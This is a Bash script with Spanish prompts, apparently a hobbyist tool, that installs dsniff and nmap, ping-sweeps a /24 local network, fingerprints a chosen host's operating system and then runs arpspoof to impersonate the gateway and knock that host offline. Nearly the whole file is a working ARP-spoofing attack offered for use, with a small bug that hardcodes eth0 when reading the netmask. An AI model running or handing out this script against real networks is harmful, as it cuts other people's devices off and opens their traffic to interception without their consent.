#!/bin/bash
function crtl_c(){
 echo ""
 echo -e "\e[31m[!] Saliendo...\e[0m"
 exit 1
}

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


#Ctrl+C
trap crtl_c INT



echo -e "
$redColour

                                
           ████████████         
       ███████████              
    ██████████                  
 ██████████                     
████████          ████████       
  ████          ████████████     
   ███        ███████████████                      ┳┳┓  ┓┏    
    ███      █████        █████                    ┃┃┃┓┏┣┫┏┓┏╋
     ███    █████  █    █  █████                   ┛ ┗┗┫┛┗┗┛┛┗
      ███   █████  ██  ██  █████                       ┛      
       ████ █████         █████       (\e[0;33m\033[1mHecho por: \e[0;34m\033[1mhttps://github.com/Riieiro\e[0m$redColour)
         ███ █████        ████  
          ███ █████     █████   
           ██████████████████   
            ███████████████████ 
                                




[!]ESTE SCRIPT SOLO FUNCIONA EN REDES CON MÁSCARA /24[!]
\e[0m

"
echo -e "${redColour}[+]Instalando el paquete dsniff y nmap..."
sudo apt install dsniff &>/dev/null
sudo apt install nmap &>/dev/null
echo ""
echo ""
echo -e -n "\e[0;33m\033[1m[+]Mostrando interfaces[+]\e[0m"
echo ""
echo ""
ip a
echo ""
echo ""
echo -e -n "\e[0;33m\033[1m[+]Elige una interfaz(Ejemplo:eth0): \e[0m"
read interfaz
echo ""

ip_sin=$(ip a | grep $interfaz | tail -n 1 | awk '{print $2}'|sed 's/\// /'|awk '{print$1}'|cut -d '.' -f 1-3).
mascara=$(ip a | grep eth0 | tail -n 1 | awk '{print $2}'|sed 's/\// /'|awk '{print$2}')

if [ $mascara -eq 24 ]; then
for port in $(seq 1 255); do
 ping -c 4 ${ip_sin}${port} &>/dev/null && echo -e "${greenColour}[+] ${ip_sin}${port}\e[0m" &
done; wait
echo ""
fi

echo -e -n "\e[0;33m\033[1m[+]Elige la ip que quieras deshabilitar:\e[0m "
read kill_ip

sudo nmap -O $kill_ip > MyHostOS.txt
echo -e "\e[0;33m\033[1m[+]El dispositivo es un" "\e[31m$(grep "Running" MyHostOS.txt | awk -F 'Running: ' ' {print $2}')\e[0m"
rm MyHostOS.txt
echo -e "${redColour}[!]NOTA: Es posible que nmap no encuentre el sistema operativo[!]\e[0m"

echo -n -e "\e[0;33m\033[1m[+]¿Quieres continuar?\e[0m(${greenColour}si\e[0m/${redColour}no\e[0m): "
read respuesta

if [ "$respuesta" = "si" ]; then
puerta_enlace=$(echo $kill_ip | sed 's/\([0-9]\+\)$/1/g')
sudo arpspoof -i "$interfaz" -t "$kill_ip" "$puerta_enlace"
fi
